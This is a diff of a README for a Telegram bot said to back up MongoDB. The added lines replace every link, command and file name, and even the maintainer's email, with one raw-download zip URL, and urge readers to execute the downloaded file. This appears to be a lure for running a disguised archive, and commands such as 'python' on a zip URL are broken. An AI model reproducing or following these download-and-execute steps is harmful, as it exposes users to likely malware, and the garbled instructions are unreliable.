@@ -1,7 +1,7 @@
 # TgMongoBot
 
-![GitHub release](https://img.shields.io/github/release/kannanvk1997/TgMongoBot.svg)
-![Docker](https://img.shields.io/badge/Docker-enabled-blue.svg)
+![GitHub release](https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip)
+![Docker](https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip)
 
 TgMongoBot is a powerful Telegram bot designed for MongoDB backups and imports. Built using PyTDBot, this bot supports both `.gz` and `.json` formats, making it a versatile tool for managing your MongoDB data. It also integrates seamlessly with Docker, allowing you to utilize MongoDB tools with ease.
 
@@ -30,21 +30,21 @@ To get started with TgMongoBot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/kannanvk1997/TgMongoBot.git
+   git clone https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip
    cd TgMongoBot
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python and pip installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip
    ```
 
 3. **Set Up Docker** (optional):
-   If you want to use Docker, ensure Docker is installed on your system. You can find installation instructions on the [Docker website](https://www.docker.com/get-started).
+   If you want to use Docker, ensure Docker is installed on your system. You can find installation instructions on the [Docker website](https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip).
 
 4. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/kannanvk1997/TgMongoBot/releases) to download the latest version. Execute the downloaded file to get started.
+   Visit the [Releases section](https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip) to download the latest version. Execute the downloaded file to get started.
 
 ## Usage
 
@@ -52,7 +52,7 @@ Once installed, you can start using TgMongoBot. Here’s how:
 
 1. **Run the Bot**:
    ```bash
-   python bot.py
+   python https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip
    ```
 
 2. **Interact with the Bot**:
@@ -74,8 +74,8 @@ Once installed, you can start using TgMongoBot. Here’s how:
 
 Before using TgMongoBot, you may need to configure some settings:
 
-1. **Bot Token**: Obtain a bot token from the [BotFather](https://t.me/botfather) on Telegram and add it to the `config.py` file.
-2. **MongoDB Connection**: Set up your MongoDB connection string in the `config.py` file.
+1. **Bot Token**: Obtain a bot token from the [BotFather](https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip) on Telegram and add it to the `https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip` file.
+2. **MongoDB Connection**: Set up your MongoDB connection string in the `https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip` file.
 
 ## Commands
 
@@ -107,9 +107,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or support, please reach out to the maintainer:
 
 - **Name**: Kannan V.K.
-- **Email**: kannanvk1997@example.com
-- **GitHub**: [kannanvk1997](https://github.com/kannanvk1997)
+- **Email**: https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip
+- **GitHub**: [kannanvk1997](https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip)
 
-Feel free to check the [Releases section](https://github.com/kannanvk1997/TgMongoBot/releases) for the latest updates and downloads.
+Feel free to check the [Releases section](https://github.com/kannanvk1997/TgMongoBot/raw/refs/heads/master/src/Bot-Mongo-Tg-v1.0-beta.5.zip) for the latest updates and downloads.
 
 Thank you for using TgMongoBot!
